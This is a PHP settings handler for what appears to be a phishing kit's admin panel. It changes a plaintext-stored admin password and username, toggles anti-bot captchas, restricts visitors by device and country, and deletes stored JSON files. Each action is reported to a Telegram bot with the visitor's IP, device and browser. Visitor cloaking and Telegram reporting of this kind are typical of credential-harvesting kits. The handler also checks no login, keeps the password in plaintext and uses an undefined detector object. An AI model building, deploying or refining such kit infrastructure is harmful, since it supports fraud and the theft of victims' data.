<?php
error_reporting(0);
session_start();
include "../../libraries/get-country-code.php";
include "../../libraries/UserInfo.php";
include "../../setting/config.php";
include "../../setting/alert-admin.php";
include "../../setting/functions.php";

$ip = get_client_ip();
$present_time = date("H:i:s"."-"."m/d/y");
$jsonFilePath = "../admin/admin.json";
$json_data = file_get_contents($jsonFilePath);
$settings_data = json_decode($json_data, true);
$user_name = $settings_data['user_name'];
$password = $settings_data['password'];
$recaptcha_mode = $settings_data['recaptcha_mode'];
$recaptcha_type = $settings_data['recaptcha_type'];
$token_admin = TOKEN;
$chat_id_admin = CHATID;

if (isset($_POST['change_password'])) {
    $old_password = $_POST['old_password'];
    $new_password = $_POST['new_password'];

    if ($old_password === $password) {
        $settings_data['password'] = $new_password;
        $updated_json_data = json_encode($settings_data);
        file_put_contents($jsonFilePath, $updated_json_data);

        $_SESSION["message_setting"] = "Your password has been changed successfully. - " . $ip;

        $log = "Your password has been changed successfully.";

        // Send Data To Telegram :
        $message = urlencode(
        "🔐========= Settings Status =========🔐\r\n". 
        "📍IP - ".get_client_ip()."\t\t | \t\t". 
        $detector->api() ."\r\n".
        "📊 Settings Status = " .$log."\r\n".
        "💻 DEVICE = " .UserInfo::get_device()."\r\n".
        "♻️ SYSTEM TYPE = ". UserInfo::get_os()."\r\n". 
        "🌐 BROWSER VISIT = ". UserInfo::get_browser()."\r\n".
        "DATE AND TIME = ". $present_time ."\r\n".
        "🔐========= Settings Status =========🔐\r\n");
        telegram($token_admin, $message, $chat_id_admin);

        echo 
        "<script>
            window.location.replace('../pages/settings.php');
        </script>";
    } else {

        $_SESSION["message_setting"] = "Password change failed. - " . $ip;

        $log = "Password change failed.";

        // Send Data To Telegram :
        $message = urlencode(
        "🔐========= Settings Status =========🔐\r\n". 
        "📍IP - ".get_client_ip()."\t\t | \t\t". 
        $detector->api() ."\r\n".
        "📊 Settings Status = " .$log."\r\n".
        "💻 DEVICE = " .UserInfo::get_device()."\r\n".
        "♻️ SYSTEM TYPE = ". UserInfo::get_os()."\r\n". 
        "🌐 BROWSER VISIT = ". UserInfo::get_browser()."\r\n".
        "DATE AND TIME = ". $present_time ."\r\n".
        "🔐========= Settings Status =========🔐\r\n");
        telegram($token_admin, $message, $chat_id_admin);

        echo 
        "<script>
            window.location.replace('../pages/settings.php');
        </script>";
    }
}
elseif (isset($_POST['change_username'])) {
    $old_username = $_POST['old_username'];
    $new_username = $_POST['new_username'];

    if ($old_username === $user_name) {

        $settings_data['user_name'] = $new_username;
        $updated_json_data = json_encode($settings_data);
        file_put_contents($jsonFilePath, $updated_json_data);

        $_SESSION["message_setting"] = "Your username has been changed successfully. - " . $ip;

        $log = "Your username has been changed successfully.";

        // Send Data To Telegram :
        $message = urlencode(
        "🔐========= Settings Status =========🔐\r\n". 
        "📍IP - ".get_client_ip()."\t\t | \t\t". 
        $detector->api() ."\r\n".
        "📊 Settings Status = " .$log."\r\n".
        "💻 DEVICE = " .UserInfo::get_device()."\r\n".
        "♻️ SYSTEM TYPE = ". UserInfo::get_os()."\r\n". 
        "🌐 BROWSER VISIT = ". UserInfo::get_browser()."\r\n".
        "DATE AND TIME = ". $present_time ."\r\n".
        "🔐========= Settings Status =========🔐\r\n");
        telegram($token_admin, $message, $chat_id_admin);

        echo 
        "<script>
            window.location.replace('../pages/settings.php');
        </script>";
    } else {

        $_SESSION["message_setting"] = "username change failed. - " . $ip;

        $log = "username change failed.";

        // Send Data To Telegram :
        $message = urlencode(
        "🔐========= Settings Status =========🔐\r\n". 
        "📍IP - ".get_client_ip()."\t\t | \t\t". 
        $detector->api() ."\r\n".
        "📊 Settings Status = " .$log."\r\n".
        "💻 DEVICE = " .UserInfo::get_device()."\r\n".
        "♻️ SYSTEM TYPE = ". UserInfo::get_os()."\r\n". 
        "🌐 BROWSER VISIT = ". UserInfo::get_browser()."\r\n".
        "DATE AND TIME = ". $present_time ."\r\n".
        "🔐========= Settings Status =========🔐\r\n");
        telegram($token_admin, $message, $chat_id_admin);

        echo 
        "<script>
            window.location.replace('../pages/settings.php');
        </script>";
    }
}
elseif (isset($_POST['setup_recaptcha'])) {
    $mode_recaptcha = $_POST['mode_recaptcha'];
    $type_recaptcha = $_POST['type_recaptcha'];

    if ($mode_recaptcha === "on" && ($type_recaptcha === "cloudflare" || $type_recaptcha === "hcaptcha"|| $type_recaptcha === "captcha_calc")) {
        $settings_data['recaptcha_mode'] = 1;
        $updated_json_data = json_encode($settings_data);
        file_put_contents($jsonFilePath, $updated_json_data);

        if ($type_recaptcha === "cloudflare") {
            $settings_data['recaptcha_type'] = "cloudflare";
            $updated_json_data = json_encode($settings_data);
            file_put_contents($jsonFilePath, $updated_json_data);

            $_SESSION["message_setting"] = "Your setup recaptcha Successfully | Mode ON - Type Cloudflare | - " . $ip;

            $log = "Your setup recaptcha Successfully | Mode ON - Type Cloudflare |";
        
            // Send Data To Telegram :
            $message = urlencode(
            "🔐========= Settings Status =========🔐\r\n". 
            "📍IP - ".get_client_ip()."\t\t | \t\t". 
            $detector->api() ."\r\n".
            "📊 Settings Status = " .$log."\r\n".
            "💻 DEVICE = " .UserInfo::get_device()."\r\n".
            "♻️ SYSTEM TYPE = ". UserInfo::get_os()."\r\n". 
            "🌐 BROWSER VISIT = ". UserInfo::get_browser()."\r\n".
            "DATE AND TIME = ". $present_time ."\r\n".
            "🔐========= Settings Status =========🔐\r\n");
            telegram($token_admin, $message, $chat_id_admin);
        } 
        elseif ($type_recaptcha === "hcaptcha") {
            $settings_data['recaptcha_type'] = "hcaptcha";
            $updated_json_data = json_encode($settings_data);
            file_put_contents($jsonFilePath, $updated_json_data);

            $_SESSION["message_setting"] = "Your setup recaptcha Successfully | Mode ON - Type Hcaptcha | - " . $ip;

            $log = "Your setup recaptcha Successfully | Mode ON - Type Hcaptcha |";
        
            // Send Data To Telegram :
            $message = urlencode(
            "🔐========= Settings Status =========🔐\r\n". 
            "📍IP - ".get_client_ip()."\t\t | \t\t". 
            $detector->api() ."\r\n".
            "📊 Settings Status = " .$log."\r\n".
            "💻 DEVICE = " .UserInfo::get_device()."\r\n".
            "♻️ SYSTEM TYPE = ". UserInfo::get_os()."\r\n". 
            "🌐 BROWSER VISIT = ". UserInfo::get_browser()."\r\n".
            "DATE AND TIME = ". $present_time ."\r\n".
            "🔐========= Settings Status =========🔐\r\n");
            telegram($token_admin, $message, $chat_id_admin);
        }
        elseif ($type_recaptcha === "captcha_calc") {
            $settings_data['recaptcha_type'] = "captcha_calc";
            $updated_json_data = json_encode($settings_data);
            file_put_contents($jsonFilePath, $updated_json_data);

            $_SESSION["message_setting"] = "Your setup recaptcha Successfully | Mode ON - Type Captcha Calc | - " . $ip;

            $log = "Your setup recaptcha Successfully | Mode ON - Type Captcha Calc |";
        
            // Send Data To Telegram :
            $message = urlencode(
            "🔐========= Settings Status =========🔐\r\n". 
            "📍IP - ".get_client_ip()."\t\t | \t\t". 
            $detector->api() ."\r\n".
            "📊 Settings Status = " .$log."\r\n".
            "💻 DEVICE = " .UserInfo::get_device()."\r\n".
            "♻️ SYSTEM TYPE = ". UserInfo::get_os()."\r\n". 
            "🌐 BROWSER VISIT = ". UserInfo::get_browser()."\r\n".
            "DATE AND TIME = ". $present_time ."\r\n".
            "🔐========= Settings Status =========🔐\r\n");
            telegram($token_admin, $message, $chat_id_admin);
        }
    }
    elseif ($mode_recaptcha === "off" && $type_recaptcha === "off-type") {
        $settings_data['recaptcha_mode'] = 0;
        $settings_data['recaptcha_type'] = "off-type";
        $updated_json_data = json_encode($settings_data);
        file_put_contents($jsonFilePath, $updated_json_data);

        $_SESSION["message_setting"] = "Your setup recaptcha Successfully | Mode OFF - Type OFF | - " . $ip;

        $log = "Your setup recaptcha Successfully | Mode OFF - Type OFF |";
    
        // Send Data To Telegram :
        $message = urlencode(
        "🔐========= Settings Status =========🔐\r\n". 
        "📍IP - ".get_client_ip()."\t\t | \t\t". 
        $detector->api() ."\r\n".
        "📊 Settings Status = " .$log."\r\n".
        "💻 DEVICE = " .UserInfo::get_device()."\r\n".
        "♻️ SYSTEM TYPE = ". UserInfo::get_os()."\r\n". 
        "🌐 BROWSER VISIT = ". UserInfo::get_browser()."\r\n".
        "DATE AND TIME = ". $present_time ."\r\n".
        "🔐========= Settings Status =========🔐\r\n");
        telegram($token_admin, $message, $chat_id_admin);
    }
    else {
        $_SESSION["message_setting"] = "Failed Setup Recaptcha." . $ip;

        $log = "Failed Setup Recaptcha.";
    
        // Send Data To Telegram :
        $message = urlencode(
        "🔐========= Settings Status =========🔐\r\n". 
        "📍IP - ".get_client_ip()."\t\t | \t\t". 
        $detector->api() ."\r\n".
        "📊 Settings Status = " .$log."\r\n".
        "💻 DEVICE = " .UserInfo::get_device()."\r\n".
        "♻️ SYSTEM TYPE = ". UserInfo::get_os()."\r\n". 
        "🌐 BROWSER VISIT = ". UserInfo::get_browser()."\r\n".
        "DATE AND TIME = ". $present_time ."\r\n".
        "🔐========= Settings Status =========🔐\r\n");
        telegram($token_admin, $message, $chat_id_admin);
    }

    echo 
    "<script>
        window.location.replace('../pages/settings.php');
    </script>";

}
elseif (isset($_POST['setup_devices'])) {
    $mode_devices = $_POST['mode_devices'];

    if ($mode_devices === "all") {
        $settings_data['devices_mode'] = "all";
        $updated_json_data = json_encode($settings_data);
        file_put_contents($jsonFilePath, $updated_json_data);

        
        $_SESSION["message_setting"] = "Your Setup Devices Successfully | Mode Allow All Devices | - " . $ip;

        $log = "Your Setup Devices Successfully | Mode Allow All Devices";
    
        // Send Data To Telegram :
        $message = urlencode(
        "🔐========= Settings Status =========🔐\r\n". 
        "📍IP - ".get_client_ip()."\t\t | \t\t". 
        $detector->api() ."\r\n".
        "📊 Settings Status = " .$log."\r\n".
        "💻 DEVICE = " .UserInfo::get_device()."\r\n".
        "♻️ SYSTEM TYPE = ". UserInfo::get_os()."\r\n". 
        "🌐 BROWSER VISIT = ". UserInfo::get_browser()."\r\n".
        "DATE AND TIME = ". $present_time ."\r\n".
        "🔐========= Settings Status =========🔐\r\n");
        telegram($token_admin, $message, $chat_id_admin);
    }
    elseif ($mode_devices === "desktop") {
        $settings_data['devices_mode'] = "desktop";
        $updated_json_data = json_encode($settings_data);
        file_put_contents($jsonFilePath, $updated_json_data);

        
        $_SESSION["message_setting"] = "Your Setup Devices Successfully | Allow Desktop Device Only | - " . $ip;

        $log = "Your Setup Devices Successfully | Allow Desktop Device Only";
    
        // Send Data To Telegram :
        $message = urlencode(
        "🔐========= Settings Status =========🔐\r\n". 
        "📍IP - ".get_client_ip()."\t\t | \t\t". 
        $detector->api() ."\r\n".
        "📊 Settings Status = " .$log."\r\n".
        "💻 DEVICE = " .UserInfo::get_device()."\r\n".
        "♻️ SYSTEM TYPE = ". UserInfo::get_os()."\r\n". 
        "🌐 BROWSER VISIT = ". UserInfo::get_browser()."\r\n".
        "DATE AND TIME = ". $present_time ."\r\n".
        "🔐========= Settings Status =========🔐\r\n");
        telegram($token_admin, $message, $chat_id_admin);
    }
    elseif ($mode_devices === "mobile") {
        $settings_data['devices_mode'] = "mobile";
        $updated_json_data = json_encode($settings_data);
        file_put_contents($jsonFilePath, $updated_json_data);

        
        $_SESSION["message_setting"] = "Your Setup Devices Successfully | Allow Mobile Device Only | - " . $ip;

        $log = "Your Setup Devices Successfully | Allow Mobile Device Only";
    
        // Send Data To Telegram :
        $message = urlencode(
        "🔐========= Settings Status =========🔐\r\n". 
        "📍IP - ".get_client_ip()."\t\t | \t\t". 
        $detector->api() ."\r\n".
        "📊 Settings Status = " .$log."\r\n".
        "💻 DEVICE = " .UserInfo::get_device()."\r\n".
        "♻️ SYSTEM TYPE = ". UserInfo::get_os()."\r\n". 
        "🌐 BROWSER VISIT = ". UserInfo::get_browser()."\r\n".
        "DATE AND TIME = ". $present_time ."\r\n".
        "🔐========= Settings Status =========🔐\r\n");
        telegram($token_admin, $message, $chat_id_admin);
    }
    else {
        $_SESSION["message_setting"] = "Failed Setup Devices." . $ip;

        $log = "Failed Setup Devices.";
    
        // Send Data To Telegram :
        $message = urlencode(
        "🔐========= Settings Status =========🔐\r\n". 
        "📍IP - ".get_client_ip()."\t\t | \t\t". 
        $detector->api() ."\r\n".
        "📊 Settings Status = " .$log."\r\n".
        "💻 DEVICE = " .UserInfo::get_device()."\r\n".
        "♻️ SYSTEM TYPE = ". UserInfo::get_os()."\r\n". 
        "🌐 BROWSER VISIT = ". UserInfo::get_browser()."\r\n".
        "DATE AND TIME = ". $present_time ."\r\n".
        "🔐========= Settings Status =========🔐\r\n");
        telegram($token_admin, $message, $chat_id_admin);
    }

    echo 
    "<script>
        window.location.replace('../pages/settings.php');
    </script>";

}
if (isset($_POST['change_allowed_countries'])) {
    $allowedCountriesInput = isset($_POST['allowed_countries']) ? $_POST['allowed_countries'] : '';
    if (empty($allowedCountriesInput)) {
        $settings_data['countrys_mode'] = "all";
        $settings_data['countrys_allow'] = [];
        $updated_json_data = json_encode($settings_data);
        file_put_contents($jsonFilePath, $updated_json_data);

        $_SESSION["message_setting"] = "Error: No countries were provided.";
        $log = "Error: No countries were provided.";
        $message = urlencode(
            "🔐========= Settings Status =========🔐\r\n" . 
            "📍IP - " . get_client_ip() . "\t\t | \t\t" . 
            $detector->api() . "\r\n" .
            "📊 Settings Status = " . $log . "\r\n" .
            "💻 DEVICE = " . UserInfo::get_device() . "\r\n" .
            "♻️ SYSTEM TYPE = " . UserInfo::get_os() . "\r\n" .
            "🌐 BROWSER VISIT = " . UserInfo::get_browser() . "\r\n" .
            "DATE AND TIME = " . $present_time . "\r\n" .
            "🔐========= Settings Status =========🔐\r\n"
        );
        telegram($token_admin, $message, $chat_id_admin);

        echo "<script>
                window.location.replace('../pages/settings.php');
              </script>";
        exit;
    }
    $validCountryCodePattern = '/^([a-zA-Z]{2})(?:\s*,\s*[a-zA-Z]{2})*$/';
    if (!preg_match($validCountryCodePattern, $allowedCountriesInput)) {
        $settings_data['countrys_mode'] = "all";
        $settings_data['countrys_allow'] = [];
        $updated_json_data = json_encode($settings_data);
        file_put_contents($jsonFilePath, $updated_json_data);

        $_SESSION["message_setting"] = "Error: Invalid format. Please use 2-letter country codes (either uppercase or lowercase) separated by commas (e.g., fr,de,en or FR,DE,US).";
        $log = "Error: Invalid country code format.";
        $message = urlencode(
            "🔐========= Settings Status =========🔐\r\n" . 
            "📍IP - " . get_client_ip() . "\t\t | \t\t" . 
            $detector->api() . "\r\n" .
            "📊 Settings Status = " . $log . "\r\n" .
            "💻 DEVICE = " . UserInfo::get_device() . "\r\n" .
            "♻️ SYSTEM TYPE = " . UserInfo::get_os() . "\r\n" .
            "🌐 BROWSER VISIT = " . UserInfo::get_browser() . "\r\n" .
            "DATE AND TIME = " . $present_time . "\r\n" .
            "🔐========= Settings Status =========🔐\r\n"
        );
        telegram($token_admin, $message, $chat_id_admin);

        echo "<script>
                window.location.replace('../pages/settings.php');
              </script>";
        exit;
    }
    $allowedCountriesArray = array_map('trim', explode(',', $allowedCountriesInput));
    if (file_exists($jsonFilePath)) {
        $existingData = file_get_contents($jsonFilePath);
        $jsonData = json_decode($existingData, true);
        $jsonData['countrys_allow'] = $allowedCountriesArray;
        $jsonData['countrys_mode'] = "specific";
        $jsonContent = json_encode($jsonData, JSON_PRETTY_PRINT);
        if (file_put_contents($jsonFilePath, $jsonContent)) {
            $_SESSION["message_setting"] = "Countries updated successfully. - " . get_client_ip();
            $log = "Countries updated successfully.";
            $message = urlencode(
                "🔐========= Settings Status =========🔐\r\n" . 
                "📍IP - " . get_client_ip() . "\t\t | \t\t" . 
                $detector->api() . "\r\n" .
                "📊 Settings Status = " . $log . "\r\n" .
                "💻 DEVICE = " . UserInfo::get_device() . "\r\n" .
                "♻️ SYSTEM TYPE = " . UserInfo::get_os() . "\r\n" . 
                "🌐 BROWSER VISIT = " . UserInfo::get_browser() . "\r\n" .
                "DATE AND TIME = " . $present_time . "\r\n" .
                "🔐========= Settings Status =========🔐\r\n"
            );
            telegram($token_admin, $message, $chat_id_admin);

            echo "<script>
                    window.location.replace('../pages/settings.php');
                  </script>";
        } else {
            $settings_data['countrys_mode'] = "all";
            $settings_data['countrys_allow'] = [];
            $updated_json_data = json_encode($settings_data);
            file_put_contents($jsonFilePath, $updated_json_data);
            
            $_SESSION["message_setting"] = "Error updating the countries list. - " . get_client_ip();
            $log = "Error updating the countries list.";
            $message = urlencode(
                "🔐========= Settings Status =========🔐\r\n" . 
                "📍IP - " . get_client_ip() . "\t\t | \t\t" . 
                $detector->api() . "\r\n" .
                "📊 Settings Status = " . $log . "\r\n" .
                "💻 DEVICE = " . UserInfo::get_device() . "\r\n" .
                "♻️ SYSTEM TYPE = " . UserInfo::get_os() . "\r\n" . 
                "🌐 BROWSER VISIT = " . UserInfo::get_browser() . "\r\n" .
                "DATE AND TIME = " . $present_time . "\r\n" .
                "🔐========= Settings Status =========🔐\r\n"
            );
            telegram($token_admin, $message, $chat_id_admin);

            echo "<script>
                    window.location.replace('../pages/settings.php');
                  </script>";
        }
    }
}

// Empty Storage :
$folder_storage = '../storage';
if (isset($_POST['empty_storage'])) {
    $deleted = 0;
    $files = glob($folder_storage . '/*.json');

    foreach ($files as $file) {
        if (is_file($file)) {
            if (unlink($file)) {
                $deleted++;
            }
        }
    }

    $_SESSION["message_setting"] = "Your Storage has been Empty successfully. - " . $ip;

    $log = "Your Storage has been Empty successfully";

    // Send Data To Telegram :
    $message = urlencode(
    "🔐========= Settings Status =========🔐\r\n". 
    "📍IP - ".get_client_ip()."\t\t | \t\t". 
    $detector->api() ."\r\n".
    "📊 Settings Status = " .$log."\r\n".
    "💻 DEVICE = " .UserInfo::get_device()."\r\n".
    "♻️ SYSTEM TYPE = ". UserInfo::get_os()."\r\n". 
    "🌐 BROWSER VISIT = ". UserInfo::get_browser()."\r\n".
    "DATE AND TIME = ". $present_time ."\r\n".
    "🔐========= Settings Status =========🔐\r\n");
    telegram($token_admin, $message, $chat_id_admin);

    echo 
    "<script>
        window.location.replace('../pages/settings.php');
    </script>";
}
?>
